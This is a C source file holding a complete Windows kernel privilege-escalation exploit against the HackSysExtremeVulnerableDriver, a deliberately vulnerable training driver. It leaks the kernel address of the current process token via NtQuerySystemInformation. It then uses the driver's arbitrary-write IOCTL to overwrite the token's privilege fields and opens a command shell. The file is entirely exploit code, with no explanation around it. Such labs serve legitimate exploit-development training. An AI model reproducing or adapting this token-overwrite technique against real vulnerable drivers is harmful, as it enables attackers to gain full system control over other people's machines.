#include <stdio.h>
#include <Windows.h>

#define STATUS_SUCCESS 0x0
#define IO_CODE 0x22200B

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
	ULONG NumberOfHandles;
	ULONG Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
	PVOID Object;
	USHORT UniqueProcessId;
	USHORT HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

PVOID GetTokenAddr(ULONG pid){
	ULONG retLength = 0;
	HINSTANCE hNtdll = LoadLibraryA("ntdll");
	HANDLE cPid = GetCurrentProcess();
	HANDLE h;
	BOOL token = OpenProcessToken(cPid, TOKEN_QUERY, &h);

	printf("[+] Attempting to leak Token Handle for the current process..\n");
	if(token == 0){
		printf("[-] Error obtaining Token Handle: %s\n", GetLastError());
	}
	printf("[+] Successfully leaked the Token Handle for the current process: 0x%X\n", h);

	PSYSTEM_HANDLE_INFORMATION_EX buffer;
	ULONG bufferSize = 0xffffff;
	buffer = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
	NTSTATUS status;
	PUCHAR token_addr = NULL;

	printf("[+] Attempting to leak the Object Address of the Token Handle..\n");
	_NtQuerySystemInformation NtQuerySysInfo = (_NtQuerySystemInformation)(GetProcAddress(hNtdll, "NtQuerySystemInformation"));
	status = NtQuerySysInfo(0x10, buffer, bufferSize, &retLength);
	if(status != STATUS_SUCCESS){
		printf("[-] NtQuerySystemInformation Failed!\n");
		exit(-1);
	}
	for (ULONG i = 0; i <= buffer->NumberOfHandles; i++){
		if((buffer->Handles[i].ProcessId == pid) && (buffer->Handles[i].ObjectTypeNumber == 5)){
			printf("[+] PID: %d, Kernel Address: 0x%p, ObjectType: %d, Handle 0x%X\n", buffer->Handles[i].ProcessId, buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
			token_addr = buffer->Handles[i].Object;
		}
	}
	return token_addr;
}

int main(int argc, char *argv[]){
	PUCHAR pTokenAddr = GetTokenAddr(GetCurrentProcessId());
	PUCHAR SepToken = pTokenAddr + 0x40;
	printf("[+] Token Kernel Address: 0x%p\n", pTokenAddr);
	printf("[+] Location of _SEP_TOKEN_PRIVILEGES: 0x%p\n", SepToken);

	printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hDriver == INVALID_HANDLE_VALUE){
		printf("[-] Error - Unable to obtain a handle to the driver..\n");
		exit(1);
	}
	printf("[+] Successfully obtained a handle to the driver..\n");

	DWORD bytesRetn;
	ULONGLONG bitties = '\xff';
	PULONGLONG ptr = &bitties;
	const size_t offset= 0x8;
	CHAR expl[16];
	
	printf("[+] Starting interaction with the driver..\n");
	printf("[+] Rewriting Present privileges..\n");
	memset(expl, 'A', offset);
	memcpy(&expl, &ptr, 0x8);
	memcpy(&expl[0x8], &SepToken, 0x8);
	DeviceIoControl(hDriver, IO_CODE, expl, 0x10, NULL, 0, &bytesRetn, NULL);

	printf("[+] Rewriting Enabled privileges..\n");
	SepToken = pTokenAddr + 0x48;
	memset(expl, 'A', offset);
	memcpy(&expl, &ptr, 0x8);
	memcpy(&expl[0x8], &SepToken, 0x8);
	DeviceIoControl(hDriver, IO_CODE, expl, 0x10, NULL, 0, &bytesRetn, NULL);

	printf("[+] Rewriting EnabledByDefault privileges..\n");
	SepToken = pTokenAddr + 0x50;
	memset(expl, 'A', offset);
	memcpy(&expl, &ptr, 0x8);
	memcpy(&expl[0x8], &SepToken, 0x8);
	DeviceIoControl(hDriver, IO_CODE, expl, 0x10, NULL, 0, &bytesRetn, NULL);

	printf("[+] Check your privileges via '!token 0x%p' or in ProcExplorer.exe!\n\n", pTokenAddr);
	CloseHandle(hDriver);
	system("cmd.exe");

	return 0;
}
